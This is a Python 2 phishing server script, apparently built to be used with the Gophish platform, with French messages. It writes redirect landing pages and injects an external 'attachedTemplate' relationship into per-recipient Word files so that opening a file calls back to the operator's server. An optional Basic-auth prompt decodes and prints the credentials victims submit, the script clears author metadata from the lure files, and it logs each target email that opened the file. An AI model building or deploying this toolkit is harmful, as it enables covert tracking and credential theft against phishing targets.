from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
from SimpleHTTPServer import SimpleHTTPRequestHandler
import argparse, sys, pytz, os, shutil, subprocess, datetime, csv, zipfile, SocketServer, ssl, base64, urllib3, re, errno
from urlparse import urlparse
from gophish import Gophish
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

ADDRESS_LISTEN = '127.0.0.1'
PORT_LISTEN = 8001
AUTH = False
ADDRESS_GOPHISH = "https://localhost:3333"
API_KEY_GOPHISH = "GOPHISH_KEY"
CAMPAINGN_NAME = ["test"]
ADDRESS_SERVER = "https://DOMAIN_JAJALICIOUS"
NAME_MALICIOUS_BASIC_FILE = "WORDFILE.docx"
NAME_MALICIOUS_BASIC_FILE_EN = "WORDFILE_English_Version.docx"
CERTFILE_PATH = "server.pem"

BASICFOLDER=os.getcwd()+"/"

def generateredirectfile(domain):
	redirectFR = """
<html><head><script>
function getUrlVars() {{
    var vars = {{}};
    var parts = window.location.href.replace(/[?&]+([^=&]+)=([^&]*)/gi, function(m,key,value) {{
        vars[key] = value;
    }});
    return vars;
}}
var rid = getUrlVars()["rid"]
window.location.href = "{ledomain}/?rid="+rid;
</script> 
</head>
<body><h1>Chargement du document...</h1></body>
</html>""".format(ledomain=domain)

	redirectEN = """
<html><head><script>
function getUrlVars() {{
    var vars = {{}};
    var parts = window.location.href.replace(/[?&]+([^=&]+)=([^&]*)/gi, function(m,key,value) {{
        vars[key] = value;
    }});
    return vars;
}}
var rid = getUrlVars()["rid"]
window.location.href = "{ledomain}/?riden="+rid;
</script> 
</head><body><h1>Document loading...</h1></body>
</html>""".format(ledomain=domain)
	file = open("redirectFR.html","w+")
	file.write(redirectFR)
	file.close()
	file = open("redirectEN.html","w+")
	file.write(redirectEN)
	file.close()

def insertcsv(mail, date, information="s/o"):
	namefile = "result"+'.csv'
	if not os.path.exists(namefile):
		with open(namefile, 'a') as f:
			writer = csv.writer(f)
			if AUTH == True:
				writer.writerow(["Email", "Information", "Date"])
			else:
				writer.writerow(["Email","Date"])
			writer.writerow([mail, date])
	else:
		with open(namefile, 'a') as f:
			writer = csv.writer(f)
			if AUTH == True:
				writer.writerow([mail, information, date])
			else:
				writer.writerow([mail, date])
	writer.close()

def getuserwithID(idgophish):
	try:
		api = Gophish(API_KEY_GOPHISH, host=ADDRESS_GOPHISH, verify=False)
		for current in api.campaigns.get():
			if current.name in CAMPAINGN_NAME:
				for currentresult in current.results:
					if currentresult.id == idgophish:
						return currentresult.email
	except:
		print "ERROR GOPHISH"
	return "ERROR"

def clearMetadata(fileRemoveMetadata):
	if not os.path.isfile(fileRemoveMetadata):
		print "Fichier "+fileRemoveMetadata+" introuvable"
		sys.exit(1)
	zip_ref = zipfile.ZipFile(fileRemoveMetadata, 'r')
	zip_ref.extractall(BASICFOLDER+"clearMetadata")
	zip_ref.close()
	# Nettoyage des metadata
	with open(BASICFOLDER+"clearMetadata"+'/docProps/core.xml', 'r') as corefile:
		content = corefile.read()
	content = re.sub('<dc:creator>.*?</dc:creator>','<dc:creator></dc:creator>', content, flags=re.DOTALL)
	content = re.sub('<cp:lastModifiedBy>.*?</cp:lastModifiedBy>','<cp:lastModifiedBy></cp:lastModifiedBy>', content, flags=re.DOTALL) 
	newcorefile = open(BASICFOLDER+"clearMetadata"+'/docProps/core.xml', "w")
	newcorefile.write(content)
	newcorefile.close()
	nouveaudoc = zipfile.ZipFile(BASICFOLDER+fileRemoveMetadata, "w")
	absolupath = os.path.abspath(BASICFOLDER+"clearMetadata")
	for dirname, subdirs, files in os.walk(BASICFOLDER+"clearMetadata"):
		for filename in files:
			if filename == fileRemoveMetadata:
				continue
			absoluname = os.path.abspath(os.path.join(dirname, filename))
			arcname = absoluname[len(absolupath) + 1:]
			nouveaudoc.write(absoluname, arcname)
	nouveaudoc.close()
	shutil.rmtree(BASICFOLDER+"clearMetadata")

def setMaliciousfile(nameorigfile, domain, rid):
	if (not re.match("^[A-Za-z0-9_-]*$", rid)) and (not rid.isalpha()):
		return
	if (os.path.isdir(BASICFOLDER+rid)) and (BASICFOLDER != (BASICFOLDER+rid)):
		shutil.rmtree(BASICFOLDER+rid)
	zip_ref = zipfile.ZipFile(nameorigfile, 'r')
	zip_ref.extractall(BASICFOLDER+rid)
	zip_ref.close()
	with open(BASICFOLDER+rid+'/word/settings.xml', 'r') as settingfile:
		content = settingfile.read()
	content = content.replace('/><w', '/><w:attachedTemplate r:id="rId2127"/><w', 1)
	newsettingfile = open(BASICFOLDER+rid+'/word/settings.xml', "w") 
	newsettingfile.write(content) 
	newsettingfile.close()
	newsettingfile = open(BASICFOLDER+rid+'/word/_rels/settings.xml.rels', "w")
	newsettingfile.write("""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
	<Relationship Id="rId2127" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"
	Target="{ledomain}/?superrid={lesuperid}"
	TargetMode="External"/>
</Relationships>""".format(ledomain=domain, lesuperid=rid)) 
	newsettingfile.close()
	nouveaudoc = zipfile.ZipFile(BASICFOLDER+rid+'/'+nameorigfile, "w")
	absolupath = os.path.abspath(BASICFOLDER+rid)
	for dirname, subdirs, files in os.walk(BASICFOLDER+rid):
		for filename in files:
			if filename == nameorigfile:
				continue
			absoluname = os.path.abspath(os.path.join(dirname, filename))
			arcname = absoluname[len(absolupath) + 1:]
			nouveaudoc.write(absoluname, arcname)
	nouveaudoc.close()

def downloadfile(getobj, rid):
	if BASICFOLDER == (BASICFOLDER+rid):
		return
	if (not re.match("^[A-Za-z0-9_-]*$", rid)) and (not rid.isalpha()):
		return
	with open(BASICFOLDER+rid+'/'+NAME_MALICIOUS_BASIC_FILE, 'rb') as f:
		getobj.send_header("Content-Type", 'application/msword')
		getobj.send_header("Content-Disposition", 'attachment; filename="{}"'.format(os.path.basename(BASICFOLDER+rid+'/'+NAME_MALICIOUS_BASIC_FILE)))
		fs = os.fstat(f.fileno())
		getobj.send_header("Content-Length", str(fs.st_size))
		getobj.end_headers()
		shutil.copyfileobj(f, getobj.wfile)
	if (os.path.isdir(BASICFOLDER+rid)) and (BASICFOLDER != (BASICFOLDER+rid)):
		shutil.rmtree(BASICFOLDER+rid)

def testparam():
	if PORT_LISTEN < 1024 and os.geteuid() != 0:
		print "Droits root necessaire pour ecouter sur "+str(PORT_LISTEN)
		sys.exit(1)
	if NAME_MALICIOUS_BASIC_FILE != "":
		if not os.path.isfile(NAME_MALICIOUS_BASIC_FILE):
			print "Fichier "+NAME_MALICIOUS_BASIC_FILE+" introuvable"
			sys.exit(1)
	else:
		print "Aucun fichier francophone specifie"
		oui = raw_input('Continuer sans fichier francophone ? [y/n]')
		if oui != 'y':
			sys.exit(2)
	if NAME_MALICIOUS_BASIC_FILE_EN != "":
		if not os.path.isfile(NAME_MALICIOUS_BASIC_FILE_EN):
			print "Fichier "+NAME_MALICIOUS_BASIC_FILE_EN+" introuvable"
			sys.exit(3)
	else:
		print "Aucun fichier anglophone specifie"
		oui = raw_input('Continuer sans fichier anglophone ? [y/n]')
		if oui != 'y':
			sys.exit(4)
	try:
		api = Gophish(API_KEY_GOPHISH, host=ADDRESS_GOPHISH, verify=False)
		api.campaigns.get()
	except:
		print "Erreur connexion Gophish"
		oui = raw_input('Continuer sans Gophish ? [y/n]')
		if oui != 'y':
			sys.exit(5)
	print "Les campagnes observees seront \""+', '.join(CAMPAINGN_NAME)+"\""
	oui = raw_input('Continuer ? [y/n]')
	if oui != 'y':
		sys.exit(4)
	print "Le domaine de destination du fichier sera \""+ADDRESS_SERVER+"\""
	oui = raw_input('Continuer ? [y/n]')
	if oui != 'y':
		sys.exit(4)

class LaSuperGestiondeRequete(SimpleHTTPRequestHandler):
	def do_AUTHHEAD(self):
		self.send_response(401)
		self.send_header('WWW-Authenticate', 'Basic realm=\"Secure Document\"')
		self.end_headers()

	def do_OPTIONS(self):
		try:
			if AUTH == True:
				if (self.headers.getheader('Authorization') == None) or (self.headers.getheader('Authorization') == "Bearer"):
					self.do_AUTHHEAD()
					self.wfile.write('no auth header received')
					pass
				elif self.headers.getheader('Authorization'):
					print base64.b64decode(self.headers.getheader('Authorization').split(" ")[1])
					pass
			else:
				superrid = query_components["superrid"]
				if superrid != "":
					mail = getuserwithID(query_components["superrid"])
					if mail != "ERROR":
						print mail+" a ouvert le fichier "+str(datetime.datetime.now(pytz.timezone('Canada/Eastern'))).split('.')[0]
						insertcsv(mail, str(datetime.datetime.now(pytz.timezone('Canada/Eastern'))).split('.')[0])
					else:
						print "Requete avec un ID Gophish inconnu"
		except:
			pass

	def do_HEAD(self):
		try:
			if AUTH == True:
				self.send_response(200)
				self.send_header('Content-type', 'text/html')
				self.end_headers()
				query = urlparse(self.path).query
				query_components = dict(qc.split("=") for qc in query.split("&"))
				superrid = query_components["superrid"]
				if superrid != "":
					mail = getuserwithID(query_components["superrid"])
					print base64.b64decode(self.headers.getheader('Authorization').split(" ")[1])
					if mail != "ERROR":
						print mail+" a ouvert le fichier "+str(datetime.datetime.now(pytz.timezone('Canada/Eastern'))).split('.')[0]
						insertcsv(mail, str(datetime.datetime.now(pytz.timezone('Canada/Eastern'))).split('.')[0], )
					else:
						print "Requete avec un ID Gophish inconnu"
			else:
				superrid = query_components["superrid"]
				if superrid != "":
					mail = getuserwithID(query_components["superrid"])
					if mail != "ERROR":
						print mail+" a ouvert le fichier "+str(datetime.datetime.now(pytz.timezone('Canada/Eastern'))).split('.')[0]
						insertcsv(mail, str(datetime.datetime.now(pytz.timezone('Canada/Eastern'))).split('.')[0])
					else:
						print "Requete avec un ID Gophish inconnu"
		except:
			pass

	def do_GET(self):
		try:
			query = urlparse(self.path).query
			query_components = dict(qc.split("=") for qc in query.split("&"))
			if "rid" in query_components:
				self.send_response(200)
				rid = query_components["rid"]
				if rid != "":
					setMaliciousfile(NAME_MALICIOUS_BASIC_FILE, ADDRESS_SERVER, rid)
					downloadfile(self, rid)
			#--Pour les anglophones --#
			elif "riden" in query_components:
				self.send_response(200)
				rid = query_components["riden"]
				if rid != "":
					setMaliciousfile(NAME_MALICIOUS_BASIC_FILE, ADDRESS_SERVER, rid)
					downloadfile(self, rid)
			elif "superrid" in query_components:
				if AUTH != True:
					superrid = query_components["superrid"]
					if superrid != "":
						mail = getuserwithID(query_components["superrid"])
						if mail != "ERROR":
							print mail+" a ouvert le fichier "+str(datetime.datetime.now(pytz.timezone('Canada/Eastern'))).split('.')[0]
							insertcsv(mail, str(datetime.datetime.now(pytz.timezone('Canada/Eastern'))).split('.')[0])
						else:
							print "Requete avec un ID Gophish inconnu"
		except:
			pass

parser = argparse.ArgumentParser()
parser.add_argument("--generateredirect", help="Permet la generation des fichier de redirection (Landing page Gophish). Exemple : --generateredirect http://vexemple.com")
parser.add_argument("--auth", help="Active l ouverture du fichier avec authentification", action='store_true')
parser.add_argument("--testparam", help="Permet de verifier les differents reglage de script.", action='store_true')
args = parser.parse_args()

if args.generateredirect is not None:
	regexURL = re.compile(
        r'^(?:http|ftp)s?://'
        r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|'
        r'localhost|'
        r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})'
        r'(?::\d+)?'
        r'(?:/?|[/?]\S+)$', re.IGNORECASE)
	if not re.match(regexURL, args.generateredirect):
		print "Format de l URL incorrect"
		sys.exit()
	if args.generateredirect[len(args.generateredirect)-1] == '/':
		args.generateredirect = args.generateredirect[:-1]
	generateredirectfile(args.generateredirect)
	sys.exit()

if args.auth is not False:
	AUTH = True

if args.testparam is not False:
	testparam()

if BASICFOLDER[-1:] != '/':
	BASICFOLDER = BASICFOLDER+'/'

print "Clear WORD metadata..."

if NAME_MALICIOUS_BASIC_FILE != "":
	clearMetadata(NAME_MALICIOUS_BASIC_FILE)

if NAME_MALICIOUS_BASIC_FILE_EN != "":
	clearMetadata(NAME_MALICIOUS_BASIC_FILE_EN)	

print "Done"

try:
	if AUTH == True:
		httpd = SocketServer.TCPServer((ADDRESS_LISTEN, int(PORT_LISTEN)), LaSuperGestiondeRequete)
		httpd.socket = ssl.wrap_socket (httpd.socket, certfile=CERTFILE_PATH, server_side=True)
	else:
		superserver = (ADDRESS_LISTEN, int(PORT_LISTEN))
		httpd = HTTPServer(superserver, LaSuperGestiondeRequete)
	print 'JajServ listen on '+ADDRESS_LISTEN+':'+str(PORT_LISTEN)+'...'
	buffer = 1
	sys.stderr = open('logfile.txt', 'w', buffer)
	httpd.serve_forever()
except IOError as e:
	if e[0] == 13: #Permission error
		print "Droits root necessaire pour ecouter sur "+str(PORT_LISTEN)
		sys.exit(2)
	else:
		print e
		sys.exit(2)
